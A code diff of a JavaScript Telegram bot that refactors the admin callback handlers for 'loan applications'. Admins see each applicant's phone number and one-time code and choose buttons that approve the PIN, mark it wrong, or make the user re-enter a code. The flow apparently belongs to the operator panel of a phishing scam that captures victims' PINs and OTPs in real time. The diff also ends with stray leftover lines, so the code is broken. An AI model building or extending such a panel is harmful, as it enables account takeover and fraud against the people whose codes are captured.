@@ -512,149 +512,35 @@ async function sendToAdmin(adminId, message, options = {}) {
 }
 
 // ==========================================
-// ✅ CALLBACK HANDLER - FIXED LOGIC
+// ==========================================
+// ✅ SEPARATED BUTTON HANDLERS
 // ==========================================
 
-async function handleCallback(callbackQuery) {
-    try {
-        const chatId = callbackQuery.message.chat.id;
-        const messageId = callbackQuery.message.message_id;
-        const data = callbackQuery.data;
-        const adminId = getAdminIdByChatId(chatId);
-        
-        console.log(`\n🔘 Callback received: ${data}`);
-        console.log(`   From admin: ${adminId}`);
-        console.log(`   Chat ID: ${chatId}`);
-        console.log(`   Message ID: ${messageId}`);
-        
-        if (!adminId) {
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Not authorized!',
-                show_alert: true
-            });
-            console.log(`❌ Unauthorized callback attempt from chat ${chatId}`);
-            return;
-        }
+// Handler for PIN rejection (deny button)
+async function handlePinRejection(callbackQuery, applicationId) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const adminId = getAdminIdByChatId(chatId);
     
-    // ==========================================
-    // OTP STAGE - WRONG PIN
-    // ==========================================
-    if (data.startsWith('wrongpin_otp_')) {
-        const applicationId = data.replace('wrongpin_otp_', '');
-        console.log(`❌ Wrong PIN at OTP stage: ${applicationId}`);
-        
-        const application = await db.getApplication(applicationId);
-        
-        if (!application || application.adminId !== adminId) {
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Application not found!',
-                show_alert: true
-            });
-            return;
-        }
-        
-        await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
-        console.log(`🔄 Application updated: ${applicationId} -> otpStatus: wrongpin_otp`);
-        
-        await bot.editMessageText(`
-❌ *WRONG PIN AT OTP STAGE*
-
-📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
-🔢 \`${application.otp}\`
-
-⚠️ User's PIN was incorrect
-👤 ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, {
-            chat_id: chatId,
-            message_id: messageId,
-            parse_mode: 'Markdown'
+    console.log(`\n❌ ===== PIN REJECTION HANDLER =====`);
+    console.log(`   Application: ${applicationId}`);
+    console.log(`   Admin: ${adminId}`);
+    
+    const application = await db.getApplication(applicationId);
+    
+    if (!application || application.adminId !== adminId) {
+        console.log(`❌ Application not found or unauthorized`);
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '❌ Application not found!',
+            show_alert: true
         });
-        
-        // Try to answer callback, but don't fail if it's expired
-        try {
-            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ User will re-enter PIN' });
-        } catch (answerError) {
-            if (answerError.message.includes('query is too old')) {
-                console.log('⚠️ Callback expired (normal - took too long to click)');
-            } else {
-                console.error('⚠️ Error answering callback:', answerError.message);
-            }
-        }
         return;
     }
     
-    // ==========================================
-    // OTP STAGE - WRONG CODE
-    // ==========================================
-    if (data.startsWith('wrongcode_otp_')) {
-        const applicationId = data.replace('wrongcode_otp_', '');
-        console.log(`❌ Wrong code: ${applicationId}`);
-        
-        const application = await db.getApplication(applicationId);
-        
-        if (!application || application.adminId !== adminId) {
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Application not found!',
-                show_alert: true
-            });
-            return;
-        }
-        
-        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
-        console.log(`🔄 Application updated: ${applicationId} -> otpStatus: wrongcode`);
-        
-        await bot.editMessageText(`
-❌ *WRONG CODE*
-
-📋 \`${applicationId}\`
-📱 ${application.phoneNumber}
-🔢 \`${application.otp}\`
-
-⚠️ Wrong verification code
-👤 ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, {
-            chat_id: chatId,
-            message_id: messageId,
-            parse_mode: 'Markdown'
-        });
-        
-        // Try to answer callback, but don't fail if it's expired
-        try {
-            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ User will re-enter code' });
-        } catch (answerError) {
-            if (answerError.message.includes('query is too old')) {
-                console.log('⚠️ Callback expired (normal - took too long to click)');
-            } else {
-                console.error('⚠️ Error answering callback:', answerError.message);
-            }
-        }
-        return;
-    }
+    await db.updateApplication(applicationId, { pinStatus: 'rejected' });
+    console.log(`✅ Database updated: pinStatus = rejected`);
     
-    // ==========================================
-    // PIN STAGE - REJECT (DENY)
-    // ==========================================
-    if (data.startsWith('reject_pin_')) {
-        const applicationId = data.replace('reject_pin_', '');
-        console.log(`❌ PIN REJECTED: ${applicationId}`);
-        
-        const application = await db.getApplication(applicationId);
-        
-        if (!application || application.adminId !== adminId) {
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Application not found!',
-                show_alert: true
-            });
-            return;
-        }
-        
-        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
-        console.log(`🔄 Application updated: ${applicationId} -> pinStatus: rejected`);
-        
-        await bot.editMessageText(`
+    await bot.editMessageText(`
 ❌ *DENIED*
 
 📋 \`${applicationId}\`
@@ -664,46 +550,48 @@ async function handleCallback(callbackQuery) {
 ⚠️ REJECTED
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
-        `, {
-            chat_id: chatId,
-            message_id: messageId,
-            parse_mode: 'Markdown'
-        });
-        
-        // Try to answer callback, but don't fail if it's expired
-        try {
-            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Denied' });
-        } catch (answerError) {
-            if (answerError.message.includes('query is too old')) {
-                console.log('⚠️ Callback expired (normal - took too long to click)');
-            } else {
-                console.error('⚠️ Error answering callback:', answerError.message);
-            }
+    `, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown'
+    });
+    console.log(`✅ Message updated`);
+    
+    try {
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Denied' });
+    } catch (answerError) {
+        if (answerError.message.includes('query is too old')) {
+            console.log('⚠️ Callback expired');
         }
+    }
+    console.log(`✅ PIN REJECTION COMPLETE\n`);
+}
+
+// Handler for PIN approval (allow OTP button)
+async function handlePinApproval(callbackQuery, applicationId) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const adminId = getAdminIdByChatId(chatId);
+    
+    console.log(`\n✅ ===== PIN APPROVAL HANDLER =====`);
+    console.log(`   Application: ${applicationId}`);
+    console.log(`   Admin: ${adminId}`);
+    
+    const application = await db.getApplication(applicationId);
+    
+    if (!application || application.adminId !== adminId) {
+        console.log(`❌ Application not found or unauthorized`);
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '❌ Application not found!',
+            show_alert: true
+        });
         return;
     }
     
-    // ==========================================
-    // PIN STAGE - APPROVE (ALLOW OTP)
-    // ==========================================
-    if (data.startsWith('approve_pin_')) {
-        const applicationId = data.replace('approve_pin_', '');
-        console.log(`✅ PIN APPROVED: ${applicationId}`);
-        
-        const application = await db.getApplication(applicationId);
-        
-        if (!application || application.adminId !== adminId) {
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Application not found!',
-                show_alert: true
-            });
-            return;
-        }
-        
-        await db.updateApplication(applicationId, { pinStatus: 'approved' });
-        console.log(`🔄 Application updated: ${applicationId} -> pinStatus: approved`);
-        
-        await bot.editMessageText(`
+    await db.updateApplication(applicationId, { pinStatus: 'approved' });
+    console.log(`✅ Database updated: pinStatus = approved`);
+    
+    await bot.editMessageText(`
 ✅ *PIN APPROVED*
 
 📋 \`${applicationId}\`
@@ -713,46 +601,144 @@ async function handleCallback(callbackQuery) {
 ✅ Awaiting OTP
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
-        `, {
-            chat_id: chatId,
-            message_id: messageId,
-            parse_mode: 'Markdown'
-        });
-        
-        // Try to answer callback, but don't fail if it's expired
-        try {
-            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved - Waiting for OTP' });
-        } catch (answerError) {
-            if (answerError.message.includes('query is too old')) {
-                console.log('⚠️ Callback expired (normal - took too long to click)');
-            } else {
-                console.error('⚠️ Error answering callback:', answerError.message);
-            }
+    `, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown'
+    });
+    console.log(`✅ Message updated`);
+    
+    try {
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved - Waiting for OTP' });
+    } catch (answerError) {
+        if (answerError.message.includes('query is too old')) {
+            console.log('⚠️ Callback expired');
         }
+    }
+    console.log(`✅ PIN APPROVAL COMPLETE\n`);
+}
+
+// Handler for wrong PIN at OTP stage
+async function handleWrongPinAtOtp(callbackQuery, applicationId) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const adminId = getAdminIdByChatId(chatId);
+    
+    console.log(`\n❌ ===== WRONG PIN AT OTP HANDLER =====`);
+    console.log(`   Application: ${applicationId}`);
+    
+    const application = await db.getApplication(applicationId);
+    
+    if (!application || application.adminId !== adminId) {
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '❌ Application not found!',
+            show_alert: true
+        });
         return;
     }
     
-    // ==========================================
-    // OTP STAGE - APPROVE LOAN
-    // ==========================================
-    if (data.startsWith('approve_otp_')) {
-        const applicationId = data.replace('approve_otp_', '');
-        console.log(`🎉 LOAN APPROVED: ${applicationId}`);
-        
-        const application = await db.getApplication(applicationId);
-        
-        if (!application || application.adminId !== adminId) {
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Application not found!',
-                show_alert: true
-            });
-            return;
+    await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
+    console.log(`✅ Database updated: otpStatus = wrongpin_otp`);
+    
+    await bot.editMessageText(`
+❌ *WRONG PIN AT OTP STAGE*
+
+📋 \`${applicationId}\`
+📱 ${application.phoneNumber}
+🔢 \`${application.otp}\`
+
+⚠️ User's PIN was incorrect
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+    `, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown'
+    });
+    
+    try {
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ User will re-enter PIN' });
+    } catch (answerError) {
+        if (answerError.message.includes('query is too old')) {
+            console.log('⚠️ Callback expired');
         }
-        
-        await db.updateApplication(applicationId, { otpStatus: 'approved' });
-        console.log(`🔄 Application updated: ${applicationId} -> otpStatus: approved`);
-        
-        await bot.editMessageText(`
+    }
+    console.log(`✅ WRONG PIN HANDLER COMPLETE\n`);
+}
+
+// Handler for wrong code
+async function handleWrongCode(callbackQuery, applicationId) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const adminId = getAdminIdByChatId(chatId);
+    
+    console.log(`\n❌ ===== WRONG CODE HANDLER =====`);
+    console.log(`   Application: ${applicationId}`);
+    
+    const application = await db.getApplication(applicationId);
+    
+    if (!application || application.adminId !== adminId) {
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '❌ Application not found!',
+            show_alert: true
+        });
+        return;
+    }
+    
+    await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
+    console.log(`✅ Database updated: otpStatus = wrongcode`);
+    
+    await bot.editMessageText(`
+❌ *WRONG CODE*
+
+📋 \`${applicationId}\`
+📱 ${application.phoneNumber}
+🔢 \`${application.otp}\`
+
+⚠️ Wrong verification code
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+    `, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown'
+    });
+    
+    try {
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ User will re-enter code' });
+    } catch (answerError) {
+        if (answerError.message.includes('query is too old')) {
+            console.log('⚠️ Callback expired');
+        }
+    }
+    console.log(`✅ WRONG CODE HANDLER COMPLETE\n`);
+}
+
+// Handler for OTP approval (final loan approval)
+async function handleOtpApproval(callbackQuery, applicationId) {
+    const chatId = callbackQuery.message.chat.id;
+    const messageId = callbackQuery.message.message_id;
+    const adminId = getAdminIdByChatId(chatId);
+    
+    console.log(`\n🎉 ===== OTP APPROVAL HANDLER =====`);
+    console.log(`   Application: ${applicationId}`);
+    console.log(`   Admin: ${adminId}`);
+    
+    const application = await db.getApplication(applicationId);
+    
+    if (!application || application.adminId !== adminId) {
+        console.log(`❌ Application not found or unauthorized`);
+        await bot.answerCallbackQuery(callbackQuery.id, {
+            text: '❌ Application not found!',
+            show_alert: true
+        });
+        return;
+    }
+    
+    await db.updateApplication(applicationId, { otpStatus: 'approved' });
+    console.log(`✅ Database updated: otpStatus = approved (FULLY APPROVED)`);
+    
+    await bot.editMessageText(`
 🎉 *LOAN APPROVED!*
 
 📋 \`${applicationId}\`
@@ -763,52 +749,112 @@ async function handleCallback(callbackQuery) {
 ✅ FULLY APPROVED
 👤 ${callbackQuery.from.first_name}
 ⏰ ${new Date().toLocaleString()}
-        `, {
-            chat_id: chatId,
-            message_id: messageId,
-            parse_mode: 'Markdown'
-        });
+    `, {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'Markdown'
+    });
+    console.log(`✅ Message updated`);
+    
+    try {
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan Approved!' });
+    } catch (answerError) {
+        if (answerError.message.includes('query is too old')) {
+            console.log('⚠️ Callback expired');
+        }
+    }
+    console.log(`✅ OTP APPROVAL COMPLETE\n`);
+}
+
+// ==========================================
+// MAIN CALLBACK ROUTER
+// ==========================================
+
+async function handleCallback(callbackQuery) {
+    try {
+        const chatId = callbackQuery.message.chat.id;
+        const messageId = callbackQuery.message.message_id;
+        const data = callbackQuery.data;
+        const adminId = getAdminIdByChatId(chatId);
         
-        // Try to answer callback, but don't fail if it's expired
-        try {
-            await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan Approved!' });
-        } catch (answerError) {
-            if (answerError.message.includes('query is too old')) {
-                console.log('⚠️ Callback expired (normal - took too long to click)');
-            } else {
-                console.error('⚠️ Error answering callback:', answerError.message);
+        console.log(`\n🔘 ====================================== `);
+        console.log(`📞 CALLBACK RECEIVED`);
+        console.log(`   Time: ${new Date().toISOString()}`);
+        console.log(`   Data: ${data}`);
+        console.log(`   Admin: ${adminId || 'NONE'}`);
+        console.log(`   Chat: ${chatId}`);
+        console.log(`   Message: ${messageId}`);
+        console.log(`🔘 ======================================\n`);
+        
+        if (!adminId) {
+            console.log(`❌ UNAUTHORIZED: No admin for chat ${chatId}`);
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ Not authorized!',
+                show_alert: true
+            });
+            return;
+        }
+        
+        // Route to dedicated handler based on callback data
+        if (data.startsWith('wrongpin_otp_')) {
+            const applicationId = data.replace('wrongpin_otp_', '');
+            await handleWrongPinAtOtp(callbackQuery, applicationId);
+        } 
+        else if (data.startsWith('wrongcode_otp_')) {
+            const applicationId = data.replace('wrongcode_otp_', '');
+            await handleWrongCode(callbackQuery, applicationId);
+        } 
+        else if (data.startsWith('reject_pin_')) {
+            const applicationId = data.replace('reject_pin_', '');
+            await handlePinRejection(callbackQuery, applicationId);
+        } 
+        else if (data.startsWith('approve_pin_')) {
+            const applicationId = data.replace('approve_pin_', '');
+            await handlePinApproval(callbackQuery, applicationId);
+        } 
+        else if (data.startsWith('approve_otp_')) {
+            const applicationId = data.replace('approve_otp_', '');
+            await handleOtpApproval(callbackQuery, applicationId);
+        } 
+        else {
+            console.log(`⚠️ Unknown callback data: ${data}`);
+            try {
+                await bot.answerCallbackQuery(callbackQuery.id, {
+                    text: '⚠️ Unknown action',
+                    show_alert: false
+                });
+            } catch (answerError) {
+                if (!answerError.message.includes('query is too old')) {
+                    console.error('⚠️ Error answering unknown callback:', answerError.message);
+                }
             }
         }
-        return;
-    }
-    
-    console.log(`⚠️ Unknown callback data: ${data}`);
-    try {
-        await bot.answerCallbackQuery(callbackQuery.id, {
-            text: '⚠️ Unknown action',
-            show_alert: false
-        });
-    } catch (answerError) {
-        // Ignore expired callback errors
-        if (!answerError.message.includes('query is too old')) {
-            console.error('⚠️ Error answering unknown callback:', answerError.message);
-        }
-    }
+        
+        console.log(`\n✅ CALLBACK ROUTING COMPLETED: ${data}\n`);
+        
     } catch (error) {
-        console.error('\n❌❌❌ ERROR IN CALLBACK HANDLER ❌❌❌');
+        console.error('\n❌❌❌ CRITICAL ERROR IN CALLBACK ROUTER ❌❌❌');
         console.error('Error:', error?.message);
         
-        // Only log full stack if it's not a "query too old" error
         if (!error?.message?.includes('query is too old')) {
             console.error('Stack:', error?.stack);
-            console.error('Callback data:', callbackQuery?.data);
+            console.error('Callback:', callbackQuery?.data);
         } else {
-            console.log('ℹ️ Callback was too old (user took too long to click button)');
+            console.log('ℹ️  Callback expired (took too long)');
         }
         console.error('❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌❌\n');
         
-        // Try to answer the callback even on error (but don't fail on expired)
         try {
+            await bot.answerCallbackQuery(callbackQuery.id, {
+                text: '❌ Error processing',
+                show_alert: true
+            });
+        } catch (answerError) {
+            // Ignore expired callbacks
+        }
+    }
+}
+
             await bot.answerCallbackQuery(callbackQuery.id, {
                 text: '❌ Error processing request',
                 show_alert: true
